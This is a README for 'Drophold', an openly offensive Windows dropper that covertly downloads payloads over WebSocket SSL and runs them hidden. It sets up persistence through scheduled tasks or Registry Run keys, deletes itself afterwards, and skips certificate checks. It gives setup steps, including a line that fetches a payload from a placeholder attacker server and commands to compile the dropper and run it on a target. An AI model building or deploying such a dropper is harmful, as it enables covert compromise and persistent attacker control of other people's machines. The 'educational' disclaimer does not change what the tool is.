# Drophold
Drophold is a foothold dispatcher and dropper for deploying and executing payloads on Windows systems. It establishes persistence, downloads payloads over a **WebSocket SSL** connection, and executes them stealthily.

## Features

- **Stealthy WebSocket SSL Payload Delivery**: Uses **WebSocket over SSL (wss://)** for secure payload retrieval.
    
- **Dynamic Drop Location**:
    
    - **Administrator Mode** → Drops in `C:\ProgramData\`.
        
    - **Standard User Mode** → Drops in `%LOCALAPPDATA%`.
        
- **Hidden Execution**: Runs the downloaded payload as a hidden process.
    
- **Persistence Mechanisms**:
    
    - **Administrator Mode** → Creates a **Scheduled Task** for execution on startup.
        
    - **Standard User Mode** → Adds a Windows **Registry Run key** for persistence.
        
- **Self-Destruction**: Deletes itself after execution.
    
- **Server Restriction**: The WebSocket server serves the payload **only** if the connection is made to `/payload`.
    

## Usage

### 1. Server Setup

1. Modify the server (`drophold-server.py`) to specify the payload file:
    
    PAYLOAD_PATH = "payload.exe"
    
2. Generate an SSL certificate (self-signed or trusted CA) and place `server.crt` and `server.key` in the server directory.
    
3. Start the WebSocket server:
    
    python drophold-server.py
    

### 2. Client (Drophold) Setup

1. Modify `Drophold.cs` to point to your WebSocket server:
    
    await DownloadFile("wss://your-server-ip/payload", exePath);
    
2. Compile the C# program using:
    
    csc /target:exe /out:Drophold.exe Drophold.cs
    
3. Execute `Drophold.exe` on the target system.
    

## Notes

- Ensure the WebSocket server is reachable from the target machine.
    
- The dropper operates silently without displaying any output.
    
- If using a self-signed SSL certificate, the client is configured to bypass validation.
    

## Disclaimer

**This project is for educational and research purposes only. Unauthorized use on systems without permission is illegal. Use responsibly.**

